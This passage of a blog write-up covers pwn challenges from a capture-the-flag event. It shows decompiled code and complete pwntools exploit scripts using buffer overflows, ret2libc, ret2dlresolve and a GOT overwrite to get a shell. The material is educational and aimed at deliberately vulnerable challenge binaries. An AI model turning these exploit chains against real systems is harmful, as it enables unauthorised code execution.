class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,</span><br><span class="line">          <span class="string">&quot;\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s\n&quot;</span></span><br><span class="line">          ,&amp;DAT_0040220e,&amp;DAT_00402209);</span><br><span class="line">  local_c = open(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (local_c &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;\nError opening flag.txt, please contact an Administrator.\n\n&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    sVar1 = read(local_c,&amp;local_d,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (sVar1 &lt; <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">    fputc((<span class="type">int</span>)local_d,<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  close(local_c);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>that print the flag so this is our target function, so lets write the exploit.</p>
<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./labyrinth&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process() </span><br><span class="line"><span class="comment">#io = remote(&#x27;46.101.73.33&#x27;,30473)</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">56</span>) + pack(<span class="number">0x0000000000401016</span>) + pack(<span class="number">0x0000000000401255</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;69&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/post3/pwn/labyrinth_op.png" alt="labyrinth_op"></p>
<h2 id="Pandora-Box"><a href="#Pandora-Box" class="headerlink" title="Pandora Box"></a>Pandora Box</h2><p><img src="/imgs/post3/pwn/pendora.png" alt="pandora_box"></p>
<p>binary ask to choose the option, opening the box cause binary to exit and choosing second option prompt us to <strong>Insert location of the library</strong>, might be ret2libc attack where we have to have the  address of libc function like system if this binary has buffer overflow okay okay lets just not make assumption for now, ask to ghidra. </p>
<p><img src="/imgs/post3/pwn/pandora_box.png" alt="pandora_box"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="type">void</span> <span class="title function_">box</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">2  </span><br><span class="line">3  &#123;</span><br><span class="line"><span class="number">4</span>    undefined8 local_38;</span><br><span class="line"><span class="number">5</span>    undefined8 local_30;</span><br><span class="line"><span class="number">6</span>    undefined8 local_28;</span><br><span class="line"><span class="number">7</span>    undefined8 local_20;</span><br><span class="line"><span class="number">8</span>    <span class="type">long</span> local_10;</span><br><span class="line"><span class="number">9</span>    </span><br><span class="line"><span class="number">10</span>   local_38 = <span class="number">0</span>;</span><br><span class="line"><span class="number">11</span>   local_30 = <span class="number">0</span>;</span><br><span class="line"><span class="number">12</span>   local_28 = <span class="number">0</span>;</span><br><span class="line"><span class="number">13</span>   local_20 = <span class="number">0</span>;</span><br><span class="line"><span class="number">14</span>   fwrite(<span class="string">&quot;This is one of Pandora\&#x27;s mythical boxes!\n\nWill you open it or Return it to the Library for analysis?\n\n1. Open.\n2. Return.\n\n&gt;&gt; &quot;</span></span><br><span class="line"><span class="number">15</span>         ,<span class="number">1</span>,<span class="number">0x7e</span>,<span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">16</span>   local_10 = read_num();</span><br><span class="line"><span class="number">17</span>   <span class="keyword">if</span> (local_10 != <span class="number">2</span>) &#123;</span><br><span class="line"><span class="number">18</span>     <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">&quot;%s\nWHAT HAVE YOU DONE?! WE ARE DOOMED!\n\n&quot;</span>,&amp;DAT_004021c7);</span><br><span class="line"><span class="number">19</span>                     <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line"><span class="number">20</span>     <span class="built_in">exit</span>(<span class="number">0x520</span>);</span><br><span class="line"><span class="number">21</span>   &#125;</span><br><span class="line"><span class="number">22</span>   fwrite(<span class="string">&quot;\nInsert location of the library: &quot;</span>,<span class="number">1</span>,<span class="number">0x21</span>,<span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">23</span>   fgets((<span class="type">char</span> *)&amp;local_38,<span class="number">0x100</span>,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="number">24</span>   fwrite(<span class="string">&quot;\nWe will deliver the mythical box to the Library for analysis, thank you!\n\n&quot;</span>,<span class="number">1</span>,<span class="number">0x4b</span>,</span><br><span class="line"><span class="number">25</span>         <span class="built_in">stdout</span>);</span><br><span class="line"><span class="number">26</span>   <span class="keyword">return</span>;</span><br><span class="line"><span class="number">27</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>hmm everything looks good until we reach the line number <strong>23</strong>, same as previous challenge <strong>local_38</strong> is undefined variable that is 8 byte , However <strong>fgets()</strong> function’s size argument is <strong>0x100</strong>, 256 in decimal and again we got BOF.</p>
<p>but in case of this binary we do not have any evil&#x2F;win function to redirect the execution flow directly by overwriting the RIP with. that means WE could perform <strong>ret2libc</strong> or <strong>ret2shell</strong> but as we have NX enabled in this binary uploading the shell on the stack is not possible </p>
<p><img src="/imgs/post3/pwn/pb_checksec.png" alt="pb_checksec"></p>
<p>As for the ret2libc YES thumbs up! </p>
<h4 id="Requirement-for-ret2libc"><a href="#Requirement-for-ret2libc" class="headerlink" title="Requirement for ret2libc"></a>Requirement for ret2libc</h4><ul>
<li>libc base address</li>
<li>system address (we would already have after leaking libc anyway)</li>
<li>&#x2F;bin&#x2F;sh address</li>
<li>we have been given libc so need to worry about libc verison</li>
</ul>
<h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pb&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    p = remote(<span class="string">&#x27;165.232.98.59&#x27;</span>, <span class="number">32729</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(elf.path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_overflow</span>():</span><br><span class="line">    <span class="built_in">print</span>(p.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(p.recvuntil(<span class="string">&#x27;: &#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>():</span><br><span class="line">    payload= <span class="string">b&quot;A&quot;</span> * <span class="number">56</span> <span class="comment"># paddding</span></span><br><span class="line">    payload+= p64(<span class="number">0x40142b</span>) <span class="comment"># pop rdi</span></span><br><span class="line">    payload+= p64(<span class="number">0x403fa0</span>) <span class="comment"># got_put</span></span><br><span class="line">    payload+= p64(<span class="number">0x401030</span>) <span class="comment"># plt_put</span></span><br><span class="line">    payload+= p64(<span class="number">0x4012c2</span>) <span class="comment"># adress of box function</span></span><br><span class="line"></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;thank you!\n\n&#x27;</span>)</span><br><span class="line">    leak = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> log.progress(<span class="string">&quot;Step 1: Leak libc address, print the address of puts&quot;</span>):</span><br><span class="line">    get_overflow()</span><br><span class="line">    leak = leak_libc()</span><br><span class="line">    log.info(<span class="string">&quot;Leaked puts: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(leak)))</span><br><span class="line">    libc.address = leak - <span class="number">0x80ed0</span> <span class="comment">#libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> log.progress(<span class="string">&quot;Step 2: use onegadget to get shell&quot;</span>):</span><br><span class="line">    get_overflow()</span><br><span class="line"></span><br><span class="line">    system = libc.sym.system </span><br><span class="line">    bin_sh = libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__() </span><br><span class="line"></span><br><span class="line">    payload=<span class="string">b&quot;A&quot;</span>*<span class="number">56</span></span><br><span class="line">    payload+=p64(<span class="number">0x401016</span>) <span class="comment"># ret</span></span><br><span class="line">    payload+=p64(<span class="number">0x40142b</span>) <span class="comment"># pop rdi</span></span><br><span class="line">    payload+= p64(bin_sh)</span><br><span class="line">    payload+= p64(system)</span><br><span class="line">   </span><br><span class="line">    p.sendline(payload) </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/post3/pwn/pd_op.png" alt="pd_op"></p>
<h2 id="Void"><a href="#Void" class="headerlink" title="Void"></a>Void</h2><p><img src="/imgs/post3/pwn/void.png" alt="void"></p>
<blockquote>
<p>Description : The room goes dark and all you can see is a damaged terminal. Hack into it to restore the power and find your way out.</p>
</blockquote>
<p>this challenge made me scratch my head, but after getting some nudges from someone on discord i blamed by myself to being a lazy skipping the hands on and just having oral look up while learning new things.</p>
<p>binary doesn’t output any thing just take user input and goes dark, lets see on ghidra</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_48 [<span class="number">64</span>];</span><br><span class="line">  </span><br><span class="line">  read(<span class="number">0</span>,local_48,<span class="number">200</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>that i come across</p>
<p>so binary only have main and <strong>vuln</strong> function to our interest vuln have buffer overflow vuln as read function is taking more than it suppose to, okay but all good here till now i though it would same as previous one we would have to perform libc2libc technique </p>
<p>but when i started debugging binary to see which function is being call&#x2F;used from libc so that i can leak address and calculate base of libc </p>
<p><img src="/imgs/post3/pwn/void_got.png" alt="void_got"></p>
<p>there are not any, except <strong>read</strong> and despite i knew that i cant leak with read function i tried to search any previous challenges or writeup to see if in case there is any way to leak libc from read function only but no use </p>
<p>SO ret2libc with <strong>ret2csu</strong>  ? </p>
<p>no, although we have gadgets we are require to have libc function i.e. puts, printf here also, so we cant either ret2libc or chain ret2csu + ret2libc   </p>
<p>as i knew i could solve the challenge just needed hint to solve the challenge hint like technique we can use to solve this cahllenge i seek for help where i am reminded <strong>ret2dlresolve</strong> technique.</p>
<p>The ret2dlresolve technique leverages the dynamic linker&#x2F;loader functionality of a program to execute arbitrary code. and is typically employed when the program does not contain any useful functions like <strong>puts</strong> or <strong>printf</strong> in our case or gadgets that can be used to achieve code execution.</p>
<p>named “ret2dlresolve” as it involves overwriting the return address on the stack to point to a “resolve” function in the dynamic linker (usually <code>__dl_resolve</code>) rather than returning to the original calling function. The <code>__dl_resolve</code> function is responsible for resolving and loading shared library dependencies at runtime.</p>
<p>so basially During a ret2dlresolve, we tricks the binary into resolving a function of our choice (such as <code>system</code>) into the PLT. This means we can use the PLT function as if it was originally part of the binary, bypassing ASLR (if present) and requiring no libc leaks. </p>
<h4 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">        elf = context.binary = ELF(<span class="string">&#x27;./void&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">        p = elf.process()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#p = remote(&#x27;104.248.169.177&#x27;,31673)</span></span><br><span class="line"></span><br><span class="line">        rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create the dlresolve object</span></span><br><span class="line">        dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">&#x27;system&#x27;</span>, args=[<span class="string">&#x27;/bin/sh&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        rop.raw(<span class="string">&#x27;A&#x27;</span> * <span class="number">72</span>)</span><br><span class="line">        rop.read(<span class="number">0</span>, dlresolve.data_addr) <span class="comment"># read to where we want to write the fake structures</span></span><br><span class="line">        rop.ret2dlresolve(dlresolve)     <span class="comment"># call .plt and dl-resolve() with the correct, calculated reloc_offset</span></span><br><span class="line"></span><br><span class="line">        log.info(rop.dump())</span><br><span class="line"></span><br><span class="line">        p.sendline(rop.chain())</span><br><span class="line">        p.sendline(dlresolve.payload)    <span class="comment"># now the read is called and we pass all the relevant structures in</span></span><br><span class="line"></span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/post3/pwn/void_op.png" alt="void_op"></p>
<p>check sources below if you wish to dive more deep </p>
<h4 id="Sources"><a href="#Sources" class="headerlink" title="Sources :"></a>Sources :</h4><p><a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf">https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf</a><br><a target="_blank" rel="noopener" href="https://kileak.github.io/ctf/2018/0ctf-qual-babystack/">https://kileak.github.io/ctf/2018/0ctf-qual-babystack/</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=6wmyaYP5WkA">https://www.youtube.com/watch?v=6wmyaYP5WkA</a><br><a target="_blank" rel="noopener" href="https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve">https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve</a> </p>
<h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><p>later i got to know the another way to solve this challenge from writeup after end of CTF<br>it is cool and efficient way exploit binary (atleast for me) lets understand how.</p>
<p>while searching for gadgets there are some interesting gadgets that we can leverage to exploit binary </p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x00401108: add [rbp-<span class="number">0</span>x3d], ebx; nop <span class="selector-attr">[rax+rax]</span>; ret;</span><br><span class="line">........</span><br><span class="line">........</span><br><span class="line"><span class="number">0</span>x004011b2: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>use <a target="_blank" rel="noopener" href="https://github.com/Ben-Lichtman/ropr">ropr</a> by Ben-Lichtman as i was having problem to get these gadgets with ropper and ROPgadget i don’t why?</p>
</blockquote>
<p>The instruction “add [rbp-0x3d], ebx” performs an addition operation between the value in the register “ebx” and the value at the memory address pointed to by the register “rbp” minus 0x3d (61 in decimal).</p>
<p>In other words, this instruction adds the value in “ebx” to the value stored at the address “rbp-0x3d” in memory. The result is then stored back at the same memory address.</p>
<p>“nop [rax+rax]” - This instruction is a no-operation (nop), which means it does nothing.<br>so it wont bother us.</p>
<p>if we manage control the <strong>rbp-0x3d</strong> memory location and <strong>ebx</strong> register we can write any target function at <strong>rbp-0x3d</strong> memory location with <strong>ebx</strong> register, for that we have need gadgets to control the rbp and rbx register and we have got see above codeblock.</p>
<p>so what we will be doing is first off, parse the <strong>read@got</strong> addr to rbp register with adding <strong>0x3d</strong> extra byte so that we can get exact addr of <strong>read@got</strong> (rbp-0x3d) + 0x3d) and then parse the target address to <strong>rbx</strong> register. <strong>YES</strong> we are doing GOT overwrite here, since we would have overwritten read@got addr on got table calling read func next time will jump to the target address we overwritten. 😉</p>
<blockquote>
<p>since the addresses of the functions in the GOT table are fixed as we PIE disabled here, hence we know the exact address of the function we want to overwrite in the GOT table. In PIE-enabled binaries, the addresses of the functions in the GOT table are randomized at runtime, making it much more difficult to know the exact address of the function to overwrite.</p>
</blockquote>
<p>and target address we are going to overwrite read@got with is one_gadget </p>
<p><img src="/imgs/post3/pwn/void_one_gadget.png" alt="void_one_gadget"></p>
<p>we have to Keep an eye on constraints of one_gadget address as we have already control on<br>r12 and r13 register </p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x004011b2: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span><br></pre></td></tr></table></figure>

<p>we do not need to bother of value being changed </p>
<h3 id="Exploit-5"><a href="#Exploit-5" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./void&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">p = process()</span><br><span class="line"><span class="comment">#p = remote()</span></span><br><span class="line"></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004011b9</span></span><br><span class="line">add_gadget = <span class="number">0x0000000000401108</span> <span class="comment"># add [rbp-0x3d], ebx; nop [rax+rax]; ret;</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15 = <span class="number">0x004011b2</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">72</span>) </span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_r14_r15) + p64(<span class="number">0xfffdce9a</span>) + p64(read_got+<span class="number">0x3d</span>) + p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(add_gadget)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>here 0xfffdce9a is negative representation of one_gagdget offet as we are using add gadget so if we want to decrease to reach read GOT we have to add with negative value<br>same as 0xc961a - libc.sym[‘read’] </p>
</blockquote>
<p><img src="/imgs/post3/pwn/void_op2.png" alt="void_op2"></p>
<h2 id="Control-Room"><a href="#Control-Room" class="headerlink" title="Control Room"></a>Control Room</h2><p><img src="/imgs/post3/pwn/control_room.jpg" alt="control_room"></p>
<p>couldn’t solve this challenge at competition time. However, after reading wirteup found so interesting that couldn’t stop me to write own one.</p>
<p>Writeup : <a target="_blank" rel="noopener" href="https://chovid99.github.io/posts/cyber-apocalypse-2023-pwn/#control-room">https://chovid99.github.io/posts/cyber-apocalypse-2023-pwn/#control-room</a> </p>
<p>binary has several of function with full of bugs that need to be chain together to gain shell, we have to analyze it sequentially </p>
<p>lets run the binary and have static look</p>
<p><img src="/imgs/post3/pwn/control_room_patch.png" alt="control_room_patch"></p>
<blockquote>
<p>make sure to patch the binary first </p>
</blockquote>
<p><img src="/imgs/post3/pwn/control_room_menu.png" alt="control_room_menu"></p>
<p>asking for username registration, confirmation and have roles and function accordingly and current role is set to Crew </p>
<p><img src="/imgs/post3/pwn/control_room_menu2.png" alt="control_room_menu2"></p>
<p>if we want to change the username binary ask for new username size that can’t be larger than the current username and also cant choose any option as it require role to technician and captain accordingly.</p>
<p><em><strong>Lets see what Ghidra says</strong></em></p>
<p>main function :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">size_t</span> sVar2;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  undefined4 local_14;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  setup();</span><br><span class="line">  local_14 = <span class="number">0</span>;</span><br><span class="line">  user_register();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nAre you sure about your username choice? (y/n)&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&gt; &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;local_14,<span class="number">4</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  sVar2 = <span class="built_in">strcspn</span>((<span class="type">char</span> *)&amp;local_14,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  *(undefined *)((<span class="type">long</span>)&amp;local_14 + sVar2) = <span class="number">0</span>;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)&amp;local_14,<span class="string">&quot;y&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    log_message(<span class="number">0</span>,<span class="string">&quot;User registered successfully.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    user_edit();</span><br><span class="line">  &#125;</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>in main first <code>setup</code> and <code>user_register</code> being called and then if user choice is “n” <code>user_edit</code> function and finally <code>menu</code> function , let analyse one by one </p>
<p>setup function :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  read_banner();</span><br><span class="line">  <span class="built_in">memset</span>(engines,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  curr_user = <span class="built_in">malloc</span>(<span class="number">0x110</span>);</span><br><span class="line">  *(undefined4 *)((<span class="type">long</span>)curr_user + <span class="number">0x100</span>) = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>engines</code> array is initialized to all 0’s, with a length of 0x80 (128 bytes).<br>Next, a block of memory is allocated with the <code>malloc()</code> function, with a size of 0x110 (272 bytes). The address of the allocated block is stored in the <code>curr_user</code> pointer.</p>
<p>the value 2 is stored in the allocated block of memory, starting at an offset of 0x100.</p>
<p>Overall, this code sets up some basic memory and I&#x2F;O configurations for a program, and allocates a block of memory for storing some user data.</p>
<p>user_register function :</p>
